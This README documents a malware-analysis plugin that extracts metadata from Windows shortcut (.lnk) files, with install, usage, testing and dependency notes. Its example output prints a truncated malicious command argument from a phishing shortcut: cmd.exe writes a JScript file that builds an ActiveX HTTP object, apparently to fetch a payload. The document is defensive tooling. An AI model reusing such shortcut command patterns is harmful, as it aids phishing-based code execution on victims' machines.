# Azul Plugin Shortcut

Plugin to feature metadata from Windows shortcut (.lnk) files using
the python package `LnkParse3`.

Shortcut files are often used in phishing emails as a vector to gain
execution on a target. The LNK format has many fields/blocks and can
contain interesting metadata about the environment where the shortcut
was created.

## Development Installation

To install azul-plugin-shortcut for development run the command
(from the root directory of this project):

```bash
pip install -e .
```

## Usage:

Parses metadata from .lnk shortcut files.

Usage on local files:

```
azul-plugin-shortcut malicious.lnk
```

Example Output:

```
----- LnkShortcut results -----
OK

Output features:
        link_relative_path: ..\..\..\WINDOWS\system32\cmd.exe
    link_tracker_volume_id: fa13fba0b9605748bab0c4edced1a216
             link_location: Local
   link_tracker_machine_id: hzx
    link_tracker_timestamp: 2016-04-20 16:13:35.500004
         link_time_created: 2008-04-15 22:00:00
         link_window_style: SW_SHOWMINNOACTIVE
         link_command_args: /c echo. 2>k.js&echo var l = new ActiveXObject("Msxml2.ServerXMLHTTP.6.0");l.open(...
   link_tracker_mac_prefix: d1-79-73
        link_time_modified: 2008-04-15 22:00:00
      link_info_drive_type: DRIVE_FIXED
          link_working_dir: %temp%
            link_base_path: C:\WINDOWS\system32\cmd.exe
        link_icon_location: C:\WINDOWS\system32\SHELL32.dll
      link_tracker_file_id: e06c8dd51207e611b48fd17973ee5357
  link_tracker_mac_address: d1-79-73-ee-53-57
            link_file_flag: FILE_ATTRIBUTE_ARCHIVE
    link_info_drive_serial: 0x685c785d
           link_icon_index: 1
                 link_flag: HasArguments
                            HasExpIcon
                            HasExpString
                            HasIconLocation
                            HasLinkInfo
                            HasRelativePath
                            HasTargetIDList
                            HasWorkingDir
                            IsUnicode
        link_time_accessed: 2016-06-22 11:15:16

Feature key:
  link_base_path:  Local base path for shortcut
  link_command_args:  Command line arguments defined in shortcut metadata
  link_file_flag:  Shortcut File Attribute Flags
  link_flag:  Shortcut Header Flags
  link_icon_index:  Index of icon to use from shortcut icon location
  link_icon_location:  Location of icon to display for shortcut
  link_info_drive_serial:  Drive serial number from link info
  link_info_drive_type:  Drive type from link info
  link_location:  Location of shortcut target
  link_relative_path:  Relative path for shortcut
  link_time_accessed:  Last access time according to shortcut header
  link_time_created:  Creation time according to shortcut header
  link_time_modified:  Last modified time according to shortcut header
  link_tracker_file_id:  Droid file guid from distributed link tracker block
  link_tracker_mac_address:  MAC address extracted from link tracker block
  link_tracker_mac_prefix:  MAC prefix/vendor extracted from link tracker block
  link_tracker_machine_id:  Netbios name from distributed link tracker block in link
  link_tracker_timestamp:  Timestamp extracted from link tracker block
  link_tracker_volume_id:  Droid volume guid from distributed link tracker block
  link_window_style:  Launch window settings for shortcut
  link_working_dir:  Working directory defined in shortcut metadata
```

Automated usage in system:

```
azul-plugin-shortcut --server http://azul-dispatcher.localnet/
```

## Python Package management

This python package is managed using a `setup.py` and `pyproject.toml` file.

Standardisation of installing and testing the python package is handled through tox.
Tox commands include:

```bash
# Run all standard tox actions
tox
# Run linting only
tox -e style
# Run tests only
tox -e test
```

## Dependency management

Dependencies are managed in the requirements.txt, requirements_test.txt and debian.txt file.

The requirements files are the python package dependencies for normal use and specific ones for tests
(e.g pytest, black, flake8 are test only dependencies).

The debian.txt file manages the debian dependencies that need to be installed on development systems and docker images.

Sometimes the debian.txt file is insufficient and in this case the Dockerfile may need to be modified directly to
install complex dependencies.
